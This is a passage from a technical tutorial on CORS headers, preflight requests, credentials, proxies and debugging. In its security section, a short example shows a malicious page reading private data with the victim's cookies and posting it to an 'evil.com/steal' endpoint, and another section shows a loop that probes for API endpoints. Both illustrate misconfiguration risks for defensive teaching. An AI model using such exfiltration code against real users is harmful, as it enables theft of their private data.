    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

#### Access-Control-Allow-Methods

Specifies allowed HTTP methods for preflight.

```javascript
// Multiple methods
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS

// Specific subset
Access-Control-Allow-Methods: GET, POST

// Case-insensitive but uppercase is convention
Access-Control-Allow-Methods: get, post // Valid but non-standard
```

#### Access-Control-Allow-Headers

Specifies which headers can be used in the actual request.

```javascript
// Common headers
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With

// Case-insensitive
Access-Control-Allow-Headers: content-type, authorization

// Wildcard (recent browsers only, not with credentials)
Access-Control-Allow-Headers: *

// Must list custom headers explicitly
Access-Control-Allow-Headers: X-Custom-Token, X-API-Key, X-Request-ID
```

##### Header Name Normalization

```javascript
// Browser normalizes header names in requests
fetch('https://api.example.com/data', {
  headers: {
    'x-CUSTOM-header': 'value'  // Sent as: x-custom-header
  }
});

// Server must allow normalized name
Access-Control-Allow-Headers: x-custom-header
```

#### Access-Control-Expose-Headers

Controls which response headers JavaScript can access.

```javascript
// Default exposed headers (always accessible):
// - Cache-Control
// - Content-Language
// - Content-Type
// - Expires
// - Last-Modified
// - Pragma

// Expose additional headers
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number, ETag

// Access in JavaScript
fetch('https://api.example.com/data')
  .then(response => {
    console.log(response.headers.get('X-Total-Count')); // Accessible
    console.log(response.headers.get('X-Custom-Header')); // null if not exposed
  });
```

#### Access-Control-Allow-Credentials

Enables requests with credentials (cookies, authorization headers, TLS certificates).

```javascript
// Server response
Access-Control-Allow-Credentials: true

// Client request
fetch('https://api.example.com/data', {
  credentials: 'include' // Send cookies
});

// Requirements when credentials: true
// 1. Access-Control-Allow-Origin CANNOT be *
// 2. Access-Control-Allow-Headers CANNOT be *
// 3. Access-Control-Allow-Methods CANNOT be *
// 4. Must specify exact origin
```

##### Credentials Modes

```javascript
// omit - never send credentials
fetch(url, { credentials: 'omit' });

// same-origin - send only for same-origin requests (default)
fetch(url, { credentials: 'same-origin' });

// include - always send credentials, even cross-origin
fetch(url, { credentials: 'include' });
```

#### Access-Control-Max-Age

Specifies how long preflight results can be cached.

```javascript
// Cache for 24 hours
Access-Control-Max-Age: 86400

// Cache for 1 hour
Access-Control-Max-Age: 3600

// Don't cache
Access-Control-Max-Age: 0

// Browser limits
// Chrome: max 2 hours (7200 seconds)
// Firefox: max 24 hours (86400 seconds)
// Safari: max 24 hours (86400 seconds)
```

##### Preflight Caching Behavior

```javascript
// First request triggers preflight
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' }
});

// Subsequent requests within cache period skip preflight
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' }
}); // No preflight if within max-age

// Different URL = different cache entry
fetch('https://api.example.com/other-endpoint', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' }
}); // New preflight required
```

### Request Credentials Handling

#### Cookie Behavior

```javascript
// Same-origin: cookies sent automatically
fetch('https://example.com/api/data'); // Cookies included

// Cross-origin: explicit opt-in required
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// Server must respond with both headers
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://app.example.com // Cannot be *
```

#### Cookie Domain and Path

```javascript
// Cookie set by api.example.com
Set-Cookie: session=abc123; Domain=example.com; Path=/; SameSite=None; Secure

// SameSite=None required for cross-origin with credentials
// Secure flag required when SameSite=None

// Browser will include this cookie when:
fetch('https://api.example.com/data', {
  credentials: 'include' // From https://app.example.com
});
```

#### Authorization Headers

```javascript
// Authorization header triggers preflight
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
  }
});

// Server must allow the header
Access-Control-Allow-Headers: Authorization

// No credentials flag needed for Authorization header
// (unless cookies are also needed)
```

### CORS Error Scenarios

#### Missing Access-Control-Allow-Origin

```javascript
// Request
fetch('https://api.example.com/data');

// Server response lacks CORS header
HTTP/1.1 200 OK
Content-Type: application/json
// Missing: Access-Control-Allow-Origin

// Browser console error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// No 'Access-Control-Allow-Origin' header is present on the 
// requested resource.
```

#### Wildcard with Credentials

```javascript
// Invalid configuration
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// Server response
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// The value of the 'Access-Control-Allow-Origin' header in the 
// response must not be the wildcard '*' when the request's 
// credentials mode is 'include'.
```

#### Preflight Failure

```javascript
// Request with custom header
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: {
    'X-Custom-Header': 'value'
  }
});

// Preflight response missing required header
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT
// Missing: Access-Control-Allow-Headers: X-Custom-Header

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// Request header field x-custom-header is not allowed by 
// Access-Control-Allow-Headers in preflight response.
```

#### Method Not Allowed

```javascript
// Request
fetch('https://api.example.com/data', {
  method: 'DELETE'
});

// Preflight response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// Method DELETE is not allowed by Access-Control-Allow-Methods 
// in preflight response.
```

#### Origin Mismatch

```javascript
// Request from https://app.example.com
fetch('https://api.example.com/data');

// Server response
Access-Control-Allow-Origin: https://other-site.com

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// The 'Access-Control-Allow-Origin' header has a value 
// 'https://other-site.com' that is not equal to the supplied origin.
```

### CORS with Different Request Types

#### XMLHttpRequest

```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data');
xhr.withCredentials = true; // Include credentials

xhr.onload = function() {
  console.log(xhr.responseText);
};

xhr.onerror = function() {
  console.error('CORS error');
};

xhr.send();
```

#### Fetch API

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  credentials: 'include',
  body: JSON.stringify({ data: 'value' })
})
.then(response => response.json())
.catch(error => {
  // Network error or CORS error
  console.error('Request failed:', error);
});
```

#### Image Loading

```javascript
// Images allow cross-origin by default (no CORS check)
const img = new Image();
img.src = 'https://cdn.example.com/image.jpg'; // Works

// Canvas tainting with cross-origin images
const img = new Image();
img.crossOrigin = 'anonymous'; // Request CORS
img.src = 'https://cdn.example.com/image.jpg';

img.onload = () => {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.drawImage(img, 0, 0);
  
  // Without CORS, this throws SecurityError
  const dataURL = canvas.toDataURL(); // Requires CORS header from server
};
```

#### Script Loading

```javascript
// Scripts execute cross-origin without CORS
<script src="https://cdn.example.com/library.js"></script>

// CORS for error reporting
<script 
  src="https://cdn.example.com/library.js"
  crossorigin="anonymous"
></script>

// Server must send CORS headers for error details
Access-Control-Allow-Origin: *
```

#### Font Loading

```javascript
// Fonts require CORS headers
@font-face {
  font-family: 'CustomFont';
  src: url('https://cdn.example.com/font.woff2');
}

// Server must respond with
Access-Control-Allow-Origin: *

// Without CORS, browser error:
// Access to font at 'https://cdn.example.com/font.woff2' from 
// origin 'https://app.example.com' has been blocked by CORS policy
```

#### CSS Background Images

```javascript
// CSS images load without CORS (like <img>)
.element {
  background-image: url('https://cdn.example.com/bg.jpg');
}

// But cannot access pixel data via canvas without CORS
```

### CORS vs Same-Origin Policy

#### Same-Origin Policy Restrictions

```javascript
// Blocked by Same-Origin Policy without CORS

// 1. Fetch/XHR to different origin
fetch('https://api.example.com/data'); // Blocked

// 2. Reading cross-origin iframe content
const iframe = document.querySelector('iframe');
iframe.src = 'https://other-site.com';
iframe.contentDocument; // SecurityError

// 3. Accessing cross-origin window properties
const popup = window.open('https://other-site.com');
popup.document; // SecurityError

// 4. Canvas pixel manipulation with cross-origin images
// (without crossOrigin attribute and CORS headers)
```

#### Allowed Cross-Origin Operations

```javascript
// Allowed by Same-Origin Policy (no CORS needed)

// 1. Embedding resources
<img src="https://other-site.com/image.jpg">
<script src="https://other-site.com/script.js"></script>
<link rel="stylesheet" href="https://other-site.com/style.css">
<video src="https://other-site.com/video.mp4"></video>
<iframe src="https://other-site.com/page"></iframe>

// 2. Form submissions
<form action="https://other-site.com/submit" method="POST">
  <input name="data" value="value">
  <button>Submit</button>
</form>

// 3. Opening windows/links
window.open('https://other-site.com');
<a href="https://other-site.com">Link</a>

// 4. Writing to cross-origin window location
popup.location = 'https://other-site.com/page';
```

### Preflight Optimization

#### Minimizing Preflight Requests

```javascript
// Strategy 1: Use simple requests when possible
// Instead of JSON with preflight
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json' // Triggers preflight
  },
  body: JSON.stringify({ key: 'value' })
});

// Use simple Content-Type (no preflight for POST)
const formData = new URLSearchParams();
formData.append('key', 'value');
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: formData
});
```

#### Maximizing Cache Duration

```javascript
// Server configuration for maximum caching
Access-Control-Max-Age: 86400 // 24 hours

// Consider browser limits
// Chrome/Safari: effectively capped at 2 hours for many scenarios
// Firefox: respects up to 24 hours

// Trade-off between preflight reduction and policy flexibility
```

#### Batching Requests

```javascript
// Multiple individual requests = multiple preflights
await fetch('https://api.example.com/users/1', { method: 'PUT' });
await fetch('https://api.example.com/users/2', { method: 'PUT' });
await fetch('https://api.example.com/users/3', { method: 'PUT' });

// Batch into single request = single preflight
await fetch('https://api.example.com/users/batch', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify([
    { id: 1, data: {} },
    { id: 2, data: {} },
    { id: 3, data: {} }
  ])
});
```

### Security Considerations

#### CORS is Not Authentication

```javascript
// CORS does NOT prevent requests, only reading responses
fetch('https://api.example.com/delete-account', {
  method: 'DELETE'
});

// If endpoint lacks authentication, the action executes
// CORS only prevents JavaScript from reading the response

// Always implement server-side authentication
app.delete('/delete-account', authenticateUser, (req, res) => {
  // Verify user identity before performing action
});
```

#### Credential Leakage Risks

```javascript
// Dangerous: reflecting any origin with credentials
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// Malicious site can make authenticated requests
// https://evil.com
fetch('https://api.example.com/private-data', {
  credentials: 'include' // Sends user's cookies
}).then(r => r.json()).then(data => {
  // Send stolen data to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

#### Origin Validation

```javascript
// Proper origin validation
const allowedOrigins = new Set([
  'https://app.example.com',
  'https://staging.example.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (origin && allowedOrigins.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Additional validation for dynamic origins
function isValidOrigin(origin) {
  try {
    const url = new URL(origin);
    // Check protocol
    if (url.protocol !== 'https:') return false;
    // Check domain pattern
    if (!url.hostname.endsWith('.example.com')) return false;
    // Check port if needed
    if (url.port && url.port !== '443') return false;
    return true;
  } catch {
    return false;
  }
}
```

#### Timing Attacks

[Inference] Preflight responses can leak information about endpoint existence:

```javascript
// Endpoint exists: 200 OK with CORS headers
// Endpoint doesn't exist: 404 Not Found

// Attacker can probe API structure
const endpoints = ['users', 'admin', 'config', 'internal'];
for (const endpoint of endpoints) {
  fetch(`https://api.example.com/${endpoint}`, {
    method: 'OPTIONS'
  }).then(response => {
    if (response.ok) {
      console.log(`Found: ${endpoint}`);
    }
  });
}

// Mitigation: consistent responses for all OPTIONS requests
app.options('*', (req, res) => {
  // Always respond with CORS headers, even for non-existent routes
  res.setHeader('Access-Control-Allow-Origin', getAllowedOrigin(req));
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.status(204).send();
});
```

### CORS Proxies

#### Proxy Pattern

```javascript
// Client makes request to same-origin proxy
fetch('/api/proxy?url=https://external-api.com/data')
  .then(response => response.json());

// Server-side proxy forwards request
app.get('/api/proxy', async (req, res) => {
  const targetUrl = req.query.url;
  
  // Validate and sanitize URL
  if (!isAllowedTarget(targetUrl)) {
    return res.status(403).json({ error: 'Forbidden target' });
  }
  
  // Forward request to external API
  const response = await fetch(targetUrl, {
    headers: {
      'User-Agent': 'MyApp/1.0'
    }
  });
  
  const data = await response.json();
  
  // Return data (no CORS issues - same origin)
  res.json(data);
});
```

#### Development Proxy

```javascript
// Webpack dev server proxy configuration
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' }
      }
    }
  }
};

// Vite proxy configuration
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
};
```

#### Public CORS Proxies

[Unverified] Third-party CORS proxies exist but pose security risks:

```javascript
// Public proxy services (security concerns apply)
const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
const targetUrl = 'https://api.example.com/data';

fetch(proxyUrl + targetUrl)
  .then(response => response.json());

// Risks:
// - Proxy can read/modify all data
// - No guarantee of availability
// - May log sensitive information
// - Could inject malicious content

// Only use trusted proxies or self-hosted solutions
```

### Advanced Patterns

#### Conditional CORS Responses

```javascript
// Apply CORS only for specific endpoints
app.get('/public-data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({ data: 'public' });
});

app.get('/private-data', authenticateUser, (req, res) => {
  const origin = req.headers.origin;
  if (isAllowedOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.json({ data: 'private' });
});
```

#### Dynamic Method Permissions

```javascript
// Different methods for different origins
app.options('/api/resource', (req, res) => {
  const origin = req.headers.origin;
  
  let allowedMethods = 'GET, HEAD, OPTIONS';
  
  if (isTrustedOrigin(origin)) {
    allowedMethods = 'GET, POST, PUT, DELETE, OPTIONS';
  } else if (isPartnerOrigin(origin)) {
    allowedMethods = 'GET, POST, OPTIONS';
  }
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', allowedMethods);
  res.status(204).send();
});
```

#### Header-Based Access Control

```javascript
// Require specific header values
app.options('/api/resource', (req, res) => {
  const requestedHeaders = req.headers['access-control-request-headers'];
  
  // Only allow if client requests API key header
  if (requestedHeaders?.includes('x-api-key')) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Headers', 'x-api-key');
  }
  
  res.status(204).send();
});

app.get('/api/resource', (req, res) => {
  const apiKey = req.headers['x-api-key'];
  
  if (!isValidApiKey(apiKey)) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.json({ data: 'protected' });
});
```

#### Subresource Integrity with CORS

```javascript
// CDN resource with integrity check
<script 
  src="https://cdn.example.com/library@1.0.0/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>

// Requires CDN to send CORS headers
Access-Control-Allow-Origin: *

// Browser verifies hash and allows execution
```

### Debugging CORS Issues

#### Browser DevTools Analysis

```javascript
// Check Network tab for preflight request
// Look for OPTIONS request with:
Request Headers:
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: content-type
  Origin: https://app.example.com

Response Headers:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST, PUT
  Access-Control-Allow-Headers: content-type
  Access-Control-Max-Age: 3600

// Red text in Console indicates CORS error
// Expand for detailed error message
```

#### Testing CORS Configuration

```javascript
// Manual preflight request
fetch('https://api.example.com/endpoint', {
  method: 'OPTIONS',
  headers: {
    'Origin': 'https://app.example.com',
    'Access-Control-Request-Method': 'PUT',
    'Access-Control-Request-Headers': 'content-type'
  }
}).then(response => {
  console.log('ACAO:', response.headers.get('access-control-allow-origin'));
  console.log('ACAM:', response.headers.get('access-control-allow-methods'));
  console.log('ACAH:', response.headers.get('access-control-allow-headers'));
  console.log('ACMA:', response.headers.get('access-control-max-age'));
});
```

#### Common Configuration Mistakes

```javascript
// Mistake 1: Only handling preflight, not actual request
app.options('/api/data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send();
});

app.post('/api/data', (req, res) => {
  // Missing CORS header on actual response!
  res.json({ success: true });
});

// Fix: Add CORS headers to all responses
// Global CORS header (basic)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});

// Mistake 2: Not handling OPTIONS (preflight)
app.post('/api/data', (req, res) => {
  // Route does not respond to OPTIONS requests
  res.json({ success: true });
});

// Fix: Handle OPTIONS explicitly (or use CORS middleware)
app.options('/api/data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.status(204).send();
});

// Mistake 3: Case sensitivity in header names
res.setHeader('access-control-allow-origin', '*'); // Works
res.setHeader('Access-Control-Allow-Origin', '*'); // Works
// Header names are case-insensitive in HTTP
```

---

## Preflight Requests (CORS)

### What Triggers a Preflight Request

A preflight request is automatically sent by the browser before the actual request when certain conditions are met. The browser sends an HTTP OPTIONS request to determine if the actual request is safe to send.

**Conditions that trigger preflight:**

- **HTTP methods other than:** GET, HEAD, or POST
- **Custom headers beyond the CORS-safelisted headers:** Accept, Accept-Language, Content-Language, Content-Type (with restrictions), Range (with byte-range restrictions)
- **Content-Type values other than:** application/x-www-form-urlencoded, multipart/form-data, or text/plain
- **Use of ReadableStream in the request body**
- **XMLHttpRequest upload event listeners registered**

### The OPTIONS Request

When a preflight is triggered, the browser sends an OPTIONS request with specific headers:

```javascript
OPTIONS /api/resource HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, x-custom-header
```

**Key preflight request headers:**

- `Origin`: The origin making the request
- `Access-Control-Request-Method`: The HTTP method the actual request will use
- `Access-Control-Request-Headers`: Comma-separated list of custom headers the actual request will include

### Server Response Requirements

The server must respond to the OPTIONS request with appropriate CORS headers to authorize the actual request:

```javascript
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: POST, PUT, DELETE
Access-Control-Allow-Headers: content-type, x-custom-header
Access-Control-Max-Age: 86400
```

**Critical response headers:**

- `Access-Control-Allow-Origin`: Specifies which origin can access the resource (or `*` for public APIs)
- `Access-Control-Allow-Methods`: Comma-separated list of allowed HTTP methods
- `Access-Control-Allow-Headers`: Comma-separated list of allowed custom headers
- `Access-Control-Max-Age`: How long (in seconds) the preflight response can be cached
- `Access-Control-Allow-Credentials`: Set to `true` if credentials are allowed

### Preflight Caching

Browsers cache preflight responses based on the `Access-Control-Max-Age` header. During the cache period, identical requests to the same endpoint skip the preflight phase.

**Cache considerations:**

- Different browsers implement different maximum cache durations
- Chrome caps at 2 hours (7200 seconds), Firefox at 24 hours (86400 seconds)
- Cache is per-origin, per-URL basis
- Changes to request method or headers may invalidate cache

### Handling Preflight in Fetch API

The fetch API automatically handles preflight requests. You don't manually create OPTIONS requests:

```javascript
// This triggers a preflight due to custom header
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'example' })
});
```

The browser automatically sends the OPTIONS request first, then proceeds with the POST if authorized.

### Credentials and Preflight

When using credentials (cookies, authorization headers), additional requirements apply:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'example' })
});
```

**Server requirements for credentialed requests:**

- `Access-Control-Allow-Credentials: true` must be present
- `Access-Control-Allow-Origin` cannot be `*` (must specify exact origin)
- `Access-Control-Allow-Headers` cannot be `*` when credentials are included

### Simple Requests vs Preflighted Requests

**Simple requests (no preflight):**

```javascript
// GET request with standard headers - no preflight
fetch('https://api.example.com/data');

// POST with form data - no preflight
fetch('https://api.example.com/form', {
  method: 'POST',
  body: new FormData(formElement)
});
```

**Preflighted requests:**

```javascript
// DELETE method - triggers preflight
fetch('https://api.example.com/resource', {
  method: 'DELETE'
});

// Custom header - triggers preflight
fetch('https://api.example.com/data', {
  headers: {
    'X-API-Key': 'abc123'
  }
});

// JSON content type - triggers preflight
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ key: 'value' })
});
```

### Preflight Failure Handling

If the preflight fails, the actual request never executes and fetch rejects with a network error:

```javascript
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: { 'X-Custom': 'value' }
})
.catch(error => {
  // This catches preflight failures
  console.error('Request failed:', error);
  // Error message: "Failed to fetch" or similar
});
```

[Inference]: The exact error message may vary by browser implementation.

**Common preflight failure reasons:**

- Server doesn't respond to OPTIONS request
- Missing required CORS headers in OPTIONS response
- Origin not allowed in `Access-Control-Allow-Origin`
- Method not listed in `Access-Control-Allow-Methods`
- Custom headers not listed in `Access-Control-Allow-Headers`
- Server returns error status (4xx, 5xx) for OPTIONS request

### Wildcard Usage in Preflight Responses

The server can use wildcards in certain headers:

```javascript
// Allow any origin (public API)
Access-Control-Allow-Origin: *

// Allow any headers
Access-Control-Allow-Headers: *

// Allow any methods
Access-Control-Allow-Methods: *
```

**Wildcard restrictions:**

- `Access-Control-Allow-Origin: *` cannot be used with credentialed requests
- `Access-Control-Allow-Headers: *` excludes the `Authorization` header when credentials are used
- Some browsers have different wildcard support levels

### Debugging Preflight Issues

**Browser DevTools inspection:**

1. Open Network tab before making request
2. Look for OPTIONS request to the same URL
3. Check request headers sent in OPTIONS
4. Verify response headers from server
5. Look for red-highlighted requests indicating CORS failures

**Common debugging patterns:**

```javascript
// Add mode to see CORS errors more clearly
fetch('https://api.example.com/data', {
  method: 'POST',
  mode: 'cors', // Explicitly set (this is the default)
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ test: true })
})
.then(response => console.log('Success:', response))
.catch(error => console.error('CORS or network error:', error));
```

### Server-Side Configuration Examples

**Express.js (Node.js):**

```javascript
app.options('/api/*', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, X-Custom-Header');
  res.header('Access-Control-Max-Age', '86400');
  res.sendStatus(204);
});
```

**Using CORS middleware:**

```javascript
const cors = require('cors');

app.use(cors({
  origin: 'https://example.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'X-Custom-Header'],
  maxAge: 86400,
  credentials: true
}));
```

### Performance Implications

**Network overhead:**

- Each preflight adds a round-trip to the server
- For high-frequency requests, this doubles latency
- Caching mitigates this after the first request

**Optimization strategies:**

- Maximize `Access-Control-Max-Age` value (up to browser limits)
- Avoid unnecessary custom headers when possible
- Use simple requests where feasible (GET, standard POST)
- Consider grouping API calls to reduce preflight frequency
- Configure CDN or reverse proxy to handle OPTIONS efficiently

### Security Considerations

**Preflight bypass risks:**

[Inference]: Simple requests that don't trigger preflight can still modify server state, so server-side validation remains critical.

- GET requests never trigger preflight, but can still carry sensitive data in URL
- Simple POST requests with form data don't trigger preflight
- Server must validate origin on the actual request, not just preflight

**Best practices:**

- Always validate `Origin` header on actual requests
- Don't rely solely on CORS for security
- Implement proper authentication and authorization
- Use HTTPS to prevent header manipulation
- Limit `Access-Control-Allow-Origin` to known origins when possible
- Don't expose sensitive endpoints to wildcard origins

---

## Simple vs Complex Requests (CORS)

### Simple Requests

Simple requests are HTTP requests that meet all of the following criteria and trigger CORS checks without a preflight OPTIONS request:

#### Method Requirements

The request must use one of these HTTP methods:

- `GET`
- `HEAD`
- `POST`

#### Header Requirements

Only the following headers are allowed (beyond user agent set headers):

- `Accept`
- `Accept-Language`
- `Content-Language`
- `Content-Type` (with restrictions)
- `Range` (with byte range restrictions)

#### Content-Type Restrictions for Simple Requests

When using `POST`, the `Content-Type` header must be one of:

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

#### No ReadableStream Usage

The request must not use a `ReadableStream` object in the body.

#### No Event Listeners on XMLHttpRequest.upload

For XMLHttpRequest specifically, no event listeners are registered on the upload object.

#### Example of a Simple Request

```javascript
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Accept': 'application/json'
  }
});
```

#### Server Response Requirements for Simple Requests

The server must include:

- `Access-Control-Allow-Origin: *` or `Access-Control-Allow-Origin: https://yourdomain.com`
- Optionally `Access-Control-Allow-Credentials: true` if credentials are needed

### Complex Requests (Preflighted Requests)

Complex requests are any requests that don't meet the simple request criteria. These trigger a preflight OPTIONS request before the actual request.

#### Triggers for Preflight

A request becomes complex when it includes:

**Custom Headers** Any header beyond the simple request allowed list:

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
  }
});
```

**Non-Simple Methods**

- `PUT`
- `DELETE`
- `PATCH`
- `CONNECT`
- `OPTIONS`
- `TRACE`

**Non-Simple Content-Types** When using `POST`, `PUT`, or `PATCH` with:

- `application/json`
- `application/xml`
- `text/xml`
- Any other content type not in the simple list

**ReadableStream in Body**

```javascript
const stream = new ReadableStream({...});
fetch(url, {
  method: 'POST',
  body: stream
});
```

### The Preflight Mechanism

#### Preflight Request Details

Before the actual request, the browser automatically sends an OPTIONS request:

```http
OPTIONS /api/resource HTTP/1.1
Host: api.example.com
Origin: https://yourdomain.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header
```

#### Preflight Response Requirements

The server must respond with appropriate CORS headers:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: content-type, x-custom-header, authorization
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true
```

#### Header Breakdown

**Access-Control-Allow-Methods** Lists which HTTP methods are permitted:

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
```

**Access-Control-Allow-Headers** Lists which custom headers are permitted:

```
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

**Access-Control-Max-Age** Specifies how long (in seconds) the preflight response can be cached:

```
Access-Control-Max-Age: 86400
```

This reduces the number of preflight requests by caching the permissions.

**Access-Control-Allow-Credentials** Indicates whether credentials (cookies, authorization headers, TLS certificates) are allowed:

```
Access-Control-Allow-Credentials: true
```

When `true`, `Access-Control-Allow-Origin` cannot be `*` and must specify the exact origin.

### Actual Request After Preflight

If the preflight succeeds, the browser sends the actual request:

```javascript
fetch('https://api.example.com/resource', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'value' })
});
```

The server must also include CORS headers in the actual response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
```

### Performance Implications

#### Simple Requests

- **One network round-trip**: Direct request to server
- **Lower latency**: No preflight delay
- **Less server load**: Fewer requests processed

#### Complex Requests

- **Two network round-trips**: Preflight OPTIONS + actual request
- **Higher latency**: Additional round-trip time (can be 50-200ms or more)
- **Increased server load**: Double the requests for uncached preflights
- **Mitigation**: Use `Access-Control-Max-Age` to cache preflight results

### Credentials and CORS

#### Including Credentials

For both simple and complex requests, credentials require explicit opt-in:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include', // Required to send cookies/auth
  headers: {
    'Content-Type': 'application/json'
  }
});
```

#### Server Requirements with Credentials

```http
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
```

**Critical restrictions**:

- Cannot use wildcard `*` for `Access-Control-Allow-Origin`
- Cannot use wildcard `*` for `Access-Control-Allow-Headers`
- Cannot use wildcard `*` for `Access-Control-Allow-Methods`

### Optimization Strategies

#### Minimize Complex Requests

When possible, design APIs to use simple requests:

- Use `GET` with query parameters instead of `POST` with JSON
- Avoid custom headers when alternatives exist
- Use simple `Content-Type` values for `POST`

#### Maximize Preflight Caching

Set long `Access-Control-Max-Age` values:

```http
Access-Control-Max-Age: 86400
```

[Inference: This typically provides 24-hour caching, though actual browser behavior may vary]

#### Conditional CORS Headers

Only include CORS headers when necessary:

```javascript
// Server-side logic
if (request.headers.origin && isAllowedOrigin(request.headers.origin)) {
  response.setHeader('Access-Control-Allow-Origin', request.headers.origin);
}
```

### Common Patterns

#### JSON API Request (Complex)

```javascript
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json', // Triggers preflight
  },
  body: JSON.stringify({ name: 'John' })
});
```

#### Authenticated Request (Complex)

```javascript
fetch('https://api.example.com/protected', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer token', // Triggers preflight
  },
  credentials: 'include'
});
```

#### Form Submission (Simple)

```javascript
const formData = new FormData();
